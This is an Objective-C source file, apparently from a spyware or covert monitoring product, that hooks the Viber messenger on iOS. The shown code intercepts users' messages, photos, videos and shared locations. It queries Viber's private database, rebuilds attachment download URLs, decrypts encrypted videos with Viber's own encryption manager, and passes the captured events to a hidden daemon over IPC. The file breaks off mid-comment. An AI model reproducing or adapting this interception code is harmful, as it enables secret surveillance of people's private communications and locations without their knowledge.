//
//  ViberUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 4/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//
#import <Foundation/Foundation.h>

#import "ViberMessage.h"
#import "ViberMessage+5-2-0.h"
#import "ViberLocation.h"
#import "DBManager.h"
#import "DBManager+31.h"
#import "Conversation.h"
#import "Attachment+Viber.h"
#import "Attachment+Viber+5-2-0.h"
#import "UserDetailsManager.h"
#import "PhoneNumberIndex.h"
#import "StickerData+Viber.h"
#import "StickersManager+Viber.h"

#import "PLPhoto.h"
#import "PLPhotoLibrary.h"

#import "StickersManager+40.h"
#import "CustomLocationManager.h"
#import "PLTMessage.h"
#import "PLTMediaMessage.h"

#import "StickersManager+4-2.h"
#import "StickerData+4-2.h"
#import "PLTMessage+4-2.h"
#import "Attachment+4-2.h"
#import "AudioSessionManager.h"
#import "PTTController.h"
#import "AttachmentUploader+5-2-0.h"
#import "MultipartUrlRequest.h"
#import "VTMHTTPRequestSetup.h"

#import "ViberUtils.h"
#import "ViberQueryOP.h"
#import "IMShareUtils.h"

#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "FxRecipient.h"
#import "StringUtils.h"
#import "DefStd.h"
#import "DaemonPrivateHome.h"
#import "TelephoneNumber.h"
#import "DateTimeFormat.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

#import "VIBUserDetailsManager.h"
#import "VIBStickersManager.h"
#import "VIBStickerData.h"

#import "VIBAttachmentUploader.h"
#import "VIBMultipartUrlRequest.h"

// 5.5.0
#import "PLTFormattedMessage.h"
#import "PLTFormattedMessageAttachment.h"
#import "VIBFormattedMessageElementAttributes.h"
#import "VIBFormattedMessageTextAttributes.h"
#import "VIBFormattedMessageAction.h"
#import "VIBSingleStickerView.h"

// 6.1.5
#import "ViberAppDelegate.h"
#import "VIBInjector.h"
#import "VIBEncryptionManager.h"
#import "VDBMessage.h"
#import "VDBAttachment.h"
#import "VDBAttachment+6-1-5.h"
#import "Attachment+6-1-5.h"
#import "ViberMessage+6-1-5.h"

// 6.2.1
#import "Viber-Member.h"
#import "Member-CoreDataProperties.h"
#import "Member-Private.h"
#import "Member-Category.h"

#import <objc/runtime.h>

static NSLock *_viberMessageQueryLock = nil;
static ViberUtils *_ViberUtils = nil;

void logAttachment(Attachment *aAttachment);

@interface ViberUtils (private)
- (void) threadInit: (NSArray *) aArray;
- (void) thread30: (NSArray *) aArray;					// for IM event
- (void) thread31: (NSArray *) aArray;					// for IM event
- (void) thread40: (NSArray *) aArgs;					// for IM event

- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent;		// for VoIP event

+ (NSData *) stickerDataWithSticker: (VIBStickerData *) aSticker;
+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

+ (void) lock;
+ (void) unlock;

@end

@implementation ViberUtils

@synthesize mQueryQueue;

@synthesize mIMSharedFileSender, mVOIPSharedFileSender;

+ (id) sharedViberUtils {
	if (_ViberUtils == nil) {
		_ViberUtils = [[ViberUtils alloc] init];
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kViberMessagePort];
			[_ViberUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kViberCallLogMessagePort1];
			[_ViberUtils setMVOIPSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_ViberUtils);
}

- (id) init {
	if ((self = [super init])) {
		mQueryQueue = [[NSOperationQueue alloc] init];
		//[mQueryQueue setMaxConcurrentOperationCount:1];
	}
	return (self);
}

+ (void) sendViberIMEvent: (FxIMEvent *) aIMEvent {
    NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
    DLog(@"Viber message after remove emoji icon = %@", msg);
    if (([msg length] > 0) || ([[aIMEvent mAttachments] count] > 0) || ([aIMEvent mShareLocation] != nil)) {
        [aIMEvent setMMessage:msg];
        
        NSMutableData *data = [[NSMutableData alloc] init];
        NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
        [archiver encodeObject:aIMEvent forKey:kViberArchied];
        [archiver finishEncoding];
        [archiver release];
        
        BOOL SendSuccess = [ViberUtils sendDataToPort:data portName:kViberMessagePort];
        DLog(@"********** First, SendSuccess %d", SendSuccess);
        if(!SendSuccess){
            [NSThread sleepForTimeInterval:2.0];
            SendSuccess = [ViberUtils sendDataToPort:data portName:kViberMessagePort];
            DLog(@"********** Second, SendSuccess %d", SendSuccess);
            if (!SendSuccess) {
                [self deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
            }
        }
        
        [data release];
    } else {
        DLog (@"Not capture this Viber Event");
    }
}

#pragma mark -
#pragma mark Viber 3.0 and earlier
#pragma mark -

+ (void) sendViberEvent: (FxIMEvent *) aIMEvent
			 Attachment: (Attachment *) aAttachment
		   viberMessage: (ViberMessage *) aViberMessage
			 shouldWait: (BOOL) aShouldWait
		  downloadVideo: (BOOL) aDownloadVideo { 
	NSString * wait = [NSString stringWithFormat:@"%d",aShouldWait];
	NSString * download = [NSString stringWithFormat:@"%d",aDownloadVideo];
	NSArray *extraArgs = [[NSArray alloc] initWithObjects:aIMEvent,download,wait,aViberMessage,aAttachment,nil];
	ViberUtils *viberUtils = [[ViberUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread30:) toTarget:viberUtils withObject:extraArgs];
	[viberUtils autorelease];
	[extraArgs release];
}

- (void) threadInit: (NSArray *) aArray {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArray retain];
    DLog (@"Arguments array = %@", aArray);
    
    
    FxIMEvent * imEvent         = [aArray objectAtIndex:0];
    BOOL download               =[[aArray objectAtIndex:1]boolValue];
    BOOL shouldWait             =[[aArray objectAtIndex:2]boolValue];
    ViberMessage *viberMessage  = [aArray objectAtIndex:3];
    //id viberAttachment          = [aArray objectAtIndex:4];
    NSDictionary *threadSafeInfo= [aArray objectAtIndex:5];
    //NSThread *bgsThread         = [aArray objectAtIndex:6];
    
//    DLog (@"imEvent			= %@",  imEvent)
//    DLog (@"download		= %d",  download)
//    DLog (@"shouldWait		= %d",  shouldWait)
//    DLog (@"viberMessage	= %@",  viberMessage)
//    DLog (@"viberAttachment	= %@",  viberAttachment)
//    DLog (@"threadSafeInfo	= %@",  threadSafeInfo)
//    DLog (@"bgsThread       = %@",  bgsThread)
    
    DLog (@"================================================================")
    DLog (@"token           = %@",  [viberMessage token])
    DLog (@"seq             = %@",  [viberMessage seq])
    DLog (@"systemType      = %@",  [viberMessage systemType])
    DLog (@"mediaType       = %@",  [viberMessage mediaType])
    DLog (@"state           = %@",  [viberMessage state])
    DLog (@"================================================================")
    
   /*
    // Make sure that we get Incoming Photo
    if ([imEvent mDirection] == kEventDirectionIn) {
        for (id eachAttachment in [imEvent mAttachments]) {
            NSInteger attempt  = 3;
            while (attempt > 0          &&      ![[NSFileManager defaultManager] fileExistsAtPath:[eachAttachment fullPath]]) {
                DLog(@"Wait for incoming Viber Photo : attempt %ld", (long)attempt)
                [NSThread sleepForTimeInterval:2];
                attempt--;
            }
            
            // If file not exist, hard code its mimetype
            if (![[NSFileManager defaultManager] fileExistsAtPath:[eachAttachment fullPath]]) {
                [eachAttachment setFullPath:@"image/jpeg"];						// -- mime type
            }
        }
 
    }
    DLog(@"Final attachment %@", [imEvent mAttachments])
    */
    

    
    if ([viberMessage respondsToSelector:@selector(attachment)]) {
        DLog (@"****************************************************************")
        DLog (@"ID			= %@",  [[viberMessage attachment] ID])
        DLog (@"seq			= %@",  [[viberMessage attachment] seq])
        DLog (@"bucket		= %@",  [[viberMessage attachment] bucket])
        DLog (@"type		= %@",  [[viberMessage attachment] type])
        DLog (@"state		= %@",  [[viberMessage attachment] state])
        DLog (@"name		= %@",  [[viberMessage attachment] name])
        DLog (@"previewPath	= %@",  [[viberMessage attachment] previewPath])
        DLog (@"****************************************************************")
    }
    
    // Checking location name again
    if ([imEvent mRepresentationOfMessage] == kIMMessageShareLocation) {
        [NSThread sleepForTimeInterval:3.0];
            
        ViberLocation *viberLocation = [viberMessage location];
        FxIMGeoTag *sharedLocation = [imEvent mShareLocation];
        [sharedLocation setMPlaceName:[viberLocation address]];
        
        DLog (@"Share location name			= %@",  [viberLocation address])
        DLog (@"Viber message location name = %@",  [viberMessage address])
        
        if ([viberLocation address] == nil) { // Viber 4.0 (Incoming)
            // Read location address from database
            [NSThread sleepForTimeInterval:5.0];
            NSArray *  dirPaths = NSSearchPathForDirectoriesInDomains( NSDocumentDirectory, NSUserDomainMask, YES);
            NSString * docsDir = [dirPaths objectAtIndex:0];
            NSString * databasePath = [[NSString alloc]  initWithString: [docsDir stringByAppendingPathComponent:   @"Contacts.data"]];
            
            NSFileManager *fileManager = [NSFileManager defaultManager];
            
            if ([fileManager fileExistsAtPath:databasePath]) {
                
                FMDatabase *db = [FMDatabase databaseWithPath:databasePath];
                [db open];
                NSNumber *seq = [viberMessage seq];
                if (seq == nil) {
                    if ([aArray count] >= 6) {
                        NSDictionary *threadSafeInfo = [aArray objectAtIndex:5];
                        seq = [threadSafeInfo objectForKey:@"seq"];
                    }
                }
                NSString *sqlSelectZPK = [NSString stringWithFormat:@"select Z_PK from ZVIBERMESSAGE where ZSEQ = %@", seq];
                DLog (@"sqlSelectZPK = %@", sqlSelectZPK)
                FMResultSet * result = [db executeQuery:sqlSelectZPK];
                if ([result next]) {
                    NSNumber *zpk = [NSNumber numberWithInt:[result intForColumnIndex:0]];
                    DLog (@"ZPK value = %@", zpk)
                    
                    NSString *sqlSelectZAddress = [NSString stringWithFormat:@"select ZADDRESS from ZVIBERLOCATION where ZMESSAGE = %@", zpk];
                    DLog (@"sqlSelectZAddress = %@", sqlSelectZAddress)
                    result = [db executeQuery:sqlSelectZAddress];
                    if ([result next]) {
                        [sharedLocation setMPlaceName:[result stringForColumnIndex:0]];
                    }
                }
                [db close];
            }
            [databasePath release];
        }
    }
    
    if(shouldWait){ // Outgoing video (below 5.0)
        
        DLog(@"==================== waiting video");
        NSAutoreleasePool *waitPool = [[NSAutoreleasePool alloc] init];
        
        Attachment *attachment = [aArray objectAtIndex:4];
        
        NSArray *  dirPaths = NSSearchPathForDirectoriesInDomains( NSDocumentDirectory, NSUserDomainMask, YES);
        NSString * docsDir = [dirPaths objectAtIndex:0];
        NSString * databasePath = [[NSString alloc]  initWithString: [docsDir stringByAppendingPathComponent:   @"Contacts.data"]];
        NSString * pathToVideo = nil;
        NSInteger wait = 0;
        NSFileManager *fileManager = [NSFileManager defaultManager];
        
        if ([fileManager fileExistsAtPath:databasePath]) {
            NSString *sql = nil;
            FMDatabase *db = [FMDatabase databaseWithPath:databasePath];
            
            while(wait <= 5 ){
                [NSThread sleepForTimeInterval:5.0];
                wait++;
                [db open];
                sql = [NSString stringWithFormat:@"SELECT ZURL FROM ZATTACHMENT WHERE ZNAME=\"%@\"",[attachment name]];
                FMResultSet * result = [db executeQuery:sql];
            
                if([result next]) {
                
                    NSURL *url = [NSURL URLWithString:[result stringForColumnIndex:0]];
                    Class $PLPhotoLibrary = objc_getClass("PLPhotoLibrary");
                    PLPhoto *photo = [[$PLPhotoLibrary sharedPhotoLibrary] photoFromAssetURL:url];
                    pathToVideo = [photo pathForOriginalFile];
                    DLog(@"pathToVideo %@",pathToVideo);
                    if([pathToVideo length]>0){
                        DLog(@"*********!!!!! GOT DATA ^-^ !!!!!**********");
                        break;
                    }else{
                        DLog(@"*********!!!!! ASSET URL NOT FOUND!!!!!**********");
                    }
                }
            [db close];
            } 
        }
        [databasePath release];
        
        if([pathToVideo length]==0){
            DLog(@"*********!!!!! (Lost data)!!!!!**********");
        }
    
        NSString * viberAttachmentPath		= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
        viberAttachmentPath					= [NSString stringWithFormat:@"%@%f%@",viberAttachmentPath,[[NSDate date]timeIntervalSince1970],[pathToVideo lastPathComponent]];
        
        /**********************************************************************************************************
         Note that we need to execute the command 'cp' instead of using NSFileManager because of Permission Denied
         **********************************************************************************************************/
        // Permission deny (tested on iPhone 4s iOS 5.0.1)
        //NSString *copyCommand				= [NSString stringWithFormat:@"cp %@ %@", pathToVideo, viberAttachmentPath];			
        //DLog (@">>> Executing the command %@", copyCommand);
        //system([copyCommand cStringUsingEncoding:NSUTF8StringEncoding]);								// write to our document directory
        
        // Copy at daemon part...
        [imEvent setMMessageIdOfIM:@"outgoing video"];	// help to indicate that this is video file
        [imEvent setMOfflineThreadId:pathToVideo];		// help to store video file path in photo library
        
        NSData * videoThumbnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
        NSMutableArray *attachments = [[NSMutableArray alloc] init];
        FxAttachment *fxattachment = [[FxAttachment alloc] init];
        [fxattachment setMThumbnail:videoThumbnail];										
        [fxattachment setFullPath:viberAttachmentPath];													// -- set fullpath
        [attachments addObject:fxattachment];
        [fxattachment release];
        
        [imEvent setMAttachments:attachments];
        [attachments release];
        
        [waitPool release];
    }
    
    if(download){ // Incoming video
        DLog(@"==================== downloading video");
        NSAutoreleasePool *downloadPool = [[NSAutoreleasePool alloc] init];
        
        id attachmentObj = [aArray objectAtIndex:4];
        
        NSArray *vAttachments = nil;
        Class $Attachment = objc_getClass("Attachment");
        Class $NSOrderedSet = objc_getClass("NSOrderedSet");
        if ([attachmentObj isKindOfClass:$Attachment]) {
            vAttachments = [NSArray arrayWithObject:attachmentObj];
        } else if ([attachmentObj isKindOfClass:$NSOrderedSet]) {
            vAttachments = [(NSOrderedSet *)attachmentObj array];
        }
        
        NSMutableArray *otherAttachments = [NSMutableArray arrayWithArray:[imEvent mAttachments]];
        
        for (Attachment *attachment in vAttachments) {
            
            if (![[attachment type] isEqualToString:@"video"] &&
                ![[attachment type] isEqualToString:@"winkVideo"]) {
                continue;
            }
            
            NSString *attBucket = [attachment bucket];
            NSString *attID = [attachment ID];
            NSString *attPreviewPath = [attachment previewPath];
            NSString *attName = [attachment name];
            
            if ([attachment bucket] == nil) { // Test only bucket then assume that ID, PreviewPath, Name are having the same value (Viber 4.0)
                if ([aArray count] >= 6) {
                    NSDictionary *threadSafeInfo = [aArray objectAtIndex:5];
                    attBucket = [threadSafeInfo objectForKey:@"att-bucket"];
                    attID = [threadSafeInfo objectForKey:@"att-id"];
                    attPreviewPath = [threadSafeInfo objectForKey:@"att-preview"];
                    attName = [threadSafeInfo objectForKey:@"att-name"];
                }
            }
            
            NSString * viberAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
            viberAttachmentPath = [NSString stringWithFormat:@"%@%@%f.mp4",viberAttachmentPath,attID, [[NSDate date]timeIntervalSince1970] ];
            
            NSString * url = nil;
            if ([attachmentObj isKindOfClass:$Attachment]) { // Below 5.2.0
                url = [NSString stringWithFormat:@"http://%@.s3.amazonaws.com/%@.mp4",attBucket,attID];
            } else if ([attachmentObj isKindOfClass:$NSOrderedSet]) { // 5.2.0
                /*
                 https://share-vb.cdn.viber.com/881c-share2014-12-26/881c6a51405d5c4e8d9de834f53a8d68fdf17f1893f9fba0016c7ce793095652.mp4
                 
                 Above url got from hook method of $AttachmentUploader$downloadRequestForAttachment$, then construct full url from url and parameters
                 
                 https://share.viber.com/download.php?Bucket=Share2014-12-26&ID=881c6a51405d5c4e8d9de834f53a8d68fdf17f1893f9fba0016c7ce793095652&Filetype=mp4&Content-Length=489&Content-Type=multipart/form-data;boundary=---------------------------14195704659626791419570465962701&boundary=---------------------------14195704659626791419570465962701&fileBottomOffset=69&fileName=&fileTopOffset=0
                 
                 Note: fileName is empty string
                 */
                
                //url = [NSString stringWithFormat:@"https://share-vb.cdn.viber.com/881c-%@/%@.mp4", attBucket, attID]; // Access Denied response
                
                VTMHTTPRequestSetup *uploadRequestSetup = nil;
                id request                              = nil;
                
                Class $AttachmentUploader = objc_getClass("AttachmentUploader");
                
                if ($AttachmentUploader) {
                    AttachmentUploader *attUploader     = [$AttachmentUploader sharedAttachmentUploader];
                    //MultipartUrlRequest *request      = [attUploader downloadRequestForAttachment:attachment];
                    request                             = [attUploader downloadRequestForAttachment:attachment];        // request is of class MultipartUrlRequest
                    uploadRequestSetup                  = [request uploadRequestSetup];
                } else {
                    Class $VIBAttachmentUploader        = objc_getClass("VIBAttachmentUploader");
                    VIBAttachmentUploader *attUploader  = [$VIBAttachmentUploader sharedVIBAttachmentUploader];
                    request                             = [attUploader downloadRequestForAttachment:attachment];        // request is of class VIBMultipartUrlRequest
                    uploadRequestSetup                  = [request uploadRequestSetup];
                }
                
                NSDictionary *httpHeaders = [uploadRequestSetup HTTPHeaders];
                NSNumber *contentLength = [httpHeaders objectForKey:@"Content-Length"];
                NSString *contentType = [httpHeaders objectForKey:@"Content-Type"];
                contentType = [contentType stringByReplacingOccurrencesOfString:@" " withString:@""]; // Need remove space because url format spec cannot contains space
                
                DLog(@"uploadRequestSetup = %@", uploadRequestSetup);
                DLog(@"HTTPHeaders = %@", httpHeaders);
                
                //url = [NSString stringWithFormat:@"%@?Bucket=%@&ID=%@&Filetype=mp4&Content-Length=%lu&Content-Type=multipart/form-data;boundary=%@&boundary=%@&fileBottomOffset=%d&fileName=&fileTopOffset=%d",[uploadRequestSetup URL], attBucket, attID, (unsigned long)[[uploadRequestSetup streamBody] length], [uploadRequestSetup streamBoundary], [uploadRequestSetup streamBoundary], [request fileBottomOffset], [request fileTopOffset]];
                url = [NSString stringWithFormat:@"%@?Bucket=%@&ID=%@&Filetype=mp4&Content-Length=%@&Content-Type=%@&boundary=%@&fileBottomOffset=%d&fileName=&fileTopOffset=%d",[uploadRequestSetup URL], attBucket, attID, contentLength, contentType, [uploadRequestSetup streamBoundary], [request fileBottomOffset], [request fileTopOffset]];
                
                if (!uploadRequestSetup) {
                    // 5.5.1, hard code parameters other than bucket ID and attachment ID
                    url = [NSString stringWithFormat:@"https://share.viber.com/download.php?Bucket=%@&ID=%@&Filetype=mp4&Content-Length=489&Content-Type=multipart/form-data;boundary=---------------------------14195704659626791419570465962701&boundary=---------------------------14195704659626791419570465962701&fileBottomOffset=69&fileName=&fileTopOffset=0", attBucket, attID];
                }
            }
            
            DLog(@"==================== url %@",url);
            NSURL * videourl = [NSURL URLWithString:url];
            
            /*
             It's possible that the data got from this method is null
             */
            NSData * video = [NSData dataWithContentsOfURL:videourl];
            DLog (@"video data %llu", (unsigned long long)[video length])
            
            /*
             // Method 1 (does not work)
            Class $AttachmentUploader = objc_getClass("AttachmentUploader");
            AttachmentUploader *attUploader = [$AttachmentUploader sharedAttachmentUploader];
            NSMutableURLRequest *request = [attUploader downloadRequestForAttachment:attachment]; // return sub class of NSMutableURLRequest which is MultipartUrlRequest
            if ([request respondsToSelector:@selector(uploadRequestSetup)]) {
                DLog(@"uploadRequestSetup = %@", [request performSelector:@selector(uploadRequestSetup)]);
            }
            [attUploader downloadAttachment:attachment startedByUser:NO];
            */
            
            /*
             // Method 2 (does not work)
            request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://share.viber.com/download.php"]];
            NSURLResponse *response = nil;
            NSError *error = nil;
            video = [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:&error];
            if (response && !error) {
                DLog(@"Success !!!!");
            }
            DLog(@"response = %@, error = %@", response, error);
            */
            
            NSMutableArray *attachments = [[NSMutableArray alloc] init];
            NSData * videoThumbnail		= [NSData dataWithContentsOfFile:attPreviewPath];
            FxAttachment *fxattachment	= [[FxAttachment alloc] init];
            [fxattachment setMThumbnail:videoThumbnail];					// -- set thumbnail
            
            if (video) {					
                if (![video writeToFile:viberAttachmentPath atomically:YES]) { // write to our document directory
                    // iOS 9, Sandbox
                    viberAttachmentPath = [IMShareUtils saveData:video toDocumentSubDirectory:@"/attachments/imViber/" fileName:[viberAttachmentPath lastPathComponent]];
                }
                
                // Decrypt video (6.0.2)
                NSData *encryptionParams = [threadSafeInfo objectForKey:@"encryptionParams"];
                DLog(@"encryptionParams : %@", encryptionParams);
                if (encryptionParams) {
                    ViberAppDelegate *vAppDelegate = (ViberAppDelegate *)[UIApplication sharedApplication].delegate;
                    VIBInjector *vInjector = vAppDelegate.injector;
                    VIBEncryptionManager *encryptionManager = vInjector.encryptionManager;
                    [encryptionManager decryptFile:viberAttachmentPath withEncryptionParams:encryptionParams];
                }
                
                [fxattachment setFullPath:viberAttachmentPath];				// -- set fullpath
            } else {
                [fxattachment setFullPath:@"video/mp4"];					// -- hard code fullpath since the actual video cannot be retrieved
            }
            
            [attachments addObject:fxattachment];
            [otherAttachments addObject:fxattachment];
            [fxattachment release];
            
            [imEvent setMAttachments:attachments];
            [attachments release];
        }
        
        [imEvent setMAttachments:otherAttachments];
        
        [downloadPool release];
    }

    //For capture thumbnail of incoming gif
    if (imEvent.mDirection == kEventDirectionIn) {
        NSOrderedSet *attachmentSet = [aArray objectAtIndex:4];
        if ([aArray objectAtIndex:4] != nil && [[attachmentSet array] count] > 0) {
            for (Attachment *attachment in [attachmentSet array]) {
                if ([[attachment type] isEqualToString:@"gif"]) {
                    DLog(@"attachment obj %@", attachment);
                    NSString* filepath = [attachment previewPath];
                    DLog(@"***=================== previewPath %@",filepath);
                    NSFileManager *fileManager = [NSFileManager defaultManager];
                    
                    int retry = 0;
                    BOOL fileExist = NO;
                    
                    while (!fileExist && retry < 5) {
                        DLog(@"***=================== preview exist %d",[fileManager fileExistsAtPath:filepath]);
                            // -- get thumbnail dat
                        if ([fileManager fileExistsAtPath:filepath]) {
                            NSData * incomingattactment = [NSData dataWithContentsOfFile:filepath];
                            DLog(@"incomingattactment length %lu", (unsigned long)[incomingattactment length]);
                            
                            FxAttachment *fxattachment	= [[FxAttachment alloc] init];
                            [fxattachment setFullPath:@"image/gif"];
                            [fxattachment setMThumbnail:incomingattactment];			// -- thumbnail
                            NSMutableArray *attachments = [[NSMutableArray alloc] init];
                            [attachments addObject:fxattachment];
                            [fxattachment release];
                            
                            imEvent.mMessage = nil;
                            imEvent.mRepresentationOfMessage = kIMMessageNone;
                            
                            [imEvent setMAttachments:attachments];
                            [attachments release];
                            
                            fileExist = YES;
                        }
                        else {
                            retry++;
                            [NSThread sleepForTimeInterval:1.0];
                        }
                    }
                }
            }
        }

    }
    
    DLog (@"------------ User shared location ----------")
    DLog (@"longitude			= %f", [[imEvent mShareLocation] mLongitude])
    DLog (@"latitude			= %f", [[imEvent mShareLocation] mLatitude])
    DLog (@"altitude			= %f", [[imEvent mShareLocation] mAltitude])
    DLog (@"hor.accuracy		= %f", [[imEvent mShareLocation] mHorAccuracy])
    DLog (@"placeName			= %@", [[imEvent mShareLocation] mPlaceName])
    DLog (@"------------ User location ----------")
    DLog (@"longitude			= %f", [[imEvent mUserLocation] mLongitude])
    DLog (@"latitude			= %f", [[imEvent mUserLocation] mLatitude])
    DLog (@"altitude			= %f", [[imEvent mUserLocation] mAltitude])
    DLog (@"hor.accuracy		= %f", [[imEvent mUserLocation] mHorAccuracy])
    DLog (@"placeName			= %@", [[imEvent mUserLocation] mPlaceName])
    DLog (@"textRepresentation	= %d", [imEvent mRepresentationOfMessage])
    DLog (@"------------ Attachment ----------")
    for (FxAttachment *attachment in [imEvent mAttachments]) {
        DLog(@"thumbnail		= %@", [[attachment mThumbnail] class])
        DLog(@"fullPath			= %@", [attachment fullPath])
    }
    
    @try {
        [ViberUtils sendViberIMEvent:imEvent];
    }
    @catch (NSException * e) {
        DLog(@"Capture viber event thread30 exception = %@", e);
    }
    @finally {
        ;
    }
    DLog (@"threadInit is exit")
    [aArray release];
    [pool release];
}

- (void) thread30: (NSArray *) aArray {
    @try {
        [self threadInit:aArray];
    }
    @catch (NSException *exception) {
        DLog(@"thread30 exception: %@", exception);
    }
    @finally {
        ;
    }
}

#pragma mark -
#pragma mark Viber 3.1, 4.0, 4.2
#pragma mark -

+ (void) captureViberMessageWithInfo: (NSDictionary *) aViberMessageInfo
					   withDBManager: (DBManager *) aDBManager
						  isOutgoing: (BOOL) aOutgoing {
	NSNumber *isOutgoing = [NSNumber numberWithBool:aOutgoing];
	NSThread *currentThread = [NSThread currentThread];
	NSArray *args = [NSArray arrayWithObjects:aViberMessageInfo, aDBManager, isOutgoing, currentThread, nil];
	ViberUtils *viberUtils = [[ViberUtils alloc] init];
	
//	if (aOutgoing) {
//		[NSThread detachNewThreadSelector:@selector(thread31:)
//								 toTarget:viberUtils
//							   withObject:args];
//		
//	} else {
		NSOperationQueue *queue = [[self sharedViberUtils] mQueryQueue];
	
		ViberQueryOP *op = [[ViberQueryOP alloc] init];
		[op setMArguments:args];
		[op setMSelector:@selector(thread31:)];
		[op setMDelegate:viberUtils];
		[op setMWaitInterval:3];
		[queue addOperation:op];
		[op release];
//	}
	
	[viberUtils autorelease];
}

void logAttachment(Attachment *aAttachment) {
    DLog(@"*** =================== type %@",[aAttachment type]);
    DLog(@"*** =================== ID %@",[aAttachment ID]);
    DLog(@"*** =================== bucket %@",[aAttachment bucket]);
    DLog(@"*** =================== path %@",[aAttachment path]);
    DLog(@"*** =================== previewPath %@",[aAttachment previewPath]);
    DLog(@"*** =================== name %@",[aAttachment name]);
    if ([aAttachment respondsToSelector:@selector(urlToContent)]) { // Below 5.6.5
        DLog(@"*** =================== urlToContent %@",[aAttachment urlToContent]);
    }
    DLog(@"*** =================== url %@",[aAttachment url]);
    DLog(@"*** =================== state %@",[aAttachment state]);
    if ([aAttachment respondsToSelector:@selector(bigPreviewPath)]) {
        DLog(@"*** =================== bigPreviewPath %@",[aAttachment bigPreviewPath]);
    }
}

- (void) thread31: (NSArray *) aArray {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[aArray retain];
	@try {
		// Thread arguments...
		NSDictionary *viberMessageInfo	= [aArray objectAtIndex:0];
		DBManager *dbManager			= [aArray objectAtIndex:1];
		BOOL isOutgoing					= [[aArray objectAtIndex:2] boolValue];
		
		DLog (@"viberMessageInfo	= %@", viberMessageInfo)
		DLog (@"dbManager			= %@", dbManager)
		DLog (@"isOutgoing			= %d", isOutgoing)
		
		ViberMessage *viberMessage	= nil;
		NSString *phoneNumber		= nil;
		BOOL waiting				= NO;
		BOOL downloadVideo			= NO;
		
		if (isOutgoing) {
			NSNumber *seq			= [viberMessageInfo objectForKey:@"seq"];
			Conversation *convs		= [viberMessageInfo objectForKey:@"convs"];
			phoneNumber				= [viberMessageInfo objectForKey:@"phoneNumber"];
			id token				= [viberMessageInfo objectForKey:@"token"];
			
			Class $ViberMessage = objc_getClass("ViberMessage");
			if ([token isKindOfClass:$ViberMessage]) {
				viberMessage = token;
			} else {
				NSAutoreleasePool *queryPool = [[NSAutoreleasePool alloc] init];
				NSSet *set = [NSSet setWithSet:[convs messages]];
				NSArray *viberMessages = [NSArray arrayWithArray:[set allObjects]];
				
				NSEnumerator *enumerator = [viberMessages reverseObjectEnumerator];
				ViberMessage *obj = nil;
				NSInteger numberOfIteration = 0;
				while (obj = [enumerator nextObject]) {
					if ([[obj seq] isEqualToNumber:seq]) {
						numberOfIteration++;
						viberMessage = obj;
						DLog (@"Found outgoing viber message, numberOfIteration = %d", (int)numberOfIteration)
						break;
					}
				}
				
				[queryPool release];
			}
			
		} else {
			//DLog (@"Acquiring the lock")
			//[ViberUtils lock];
			//DLog (@"Acquired lock")
			
			// Wait a bit
			//[NSThread sleepForTimeInterval:3.0];
			//DLog (@"The thread is wake up ...")
			
			NSNumber *seq		= [viberMessageInfo objectForKey:@"seq"];
			Conversation *convs	= [viberMessageInfo objectForKey:@"convs"];
			phoneNumber			= [viberMessageInfo objectForKey:@"phoneNumber"];
			NSNumber *token		= [viberMessageInfo objectForKey:@"token"];
			
			NSSet *set = [NSSet setWithSet:[convs messages]];
			NSArray *viberMessages = [NSArray arrayWithArray:[set allObjects]];
			
			NSAutoreleasePool *queryPool = [[NSAutoreleasePool alloc] init];
			
			NSEnumerator *enumerator = [viberMessages reverseObjectEnumerator];
			ViberMessage *obj = nil;
			NSInteger numberOfIteration = 0;
			while (obj = [enumerator nextObject]) {
				if ([[obj seq] isEqualToNumber:seq]		&&
					[[obj token] isEqualToNumber:token]) {
					numberOfIteration++;
					viberMessage = obj;
					DLog (@"Found incoming viber message, numberOfIteration = %d", (int)numberOfIteration)
					break;
				}
			}
			
			[queryPool release];
			
			//DLog (@"Releasing the lock")
			//[ViberUtils unlock];
			//DLog (@"Released the lock")
		}
		DLog (@"phoneNumber		= %@", phoneNumber)
		DLog (@"viberMessage	= %@", viberMessage)
		
		//---- Capture
		ViberMessage *result = viberMessage;
		//ViberMessage *result = nil;
        id attachmentObj = nil;
        if ([result respondsToSelector:@selector(attachment)]) { // Below 5.2.0
            attachmentObj = [result attachment]; // Attachment
        } else if ([result respondsToSelector:@selector(attachments)]) { // 5.2.0 and above
            if ([[result attachments] count] > 0) {
                attachmentObj = [result attachments]; // NSOrderedSet
            }
        }
		Conversation *conv = result.conversation;
        
        Attachment *attachment = nil;
        BOOL compatibleType = YES;
        Class $NSOrderedSet = objc_getClass("NSOrderedSet");
        Class $Attachment = objc_getClass("Attachment");
        if ([attachmentObj isKindOfClass:$NSOrderedSet]) {
            compatibleType = NO;
        } else if ([attachmentObj isKindOfClass:$Attachment]) {
            attachment = attachmentObj;
		}
        
        /*
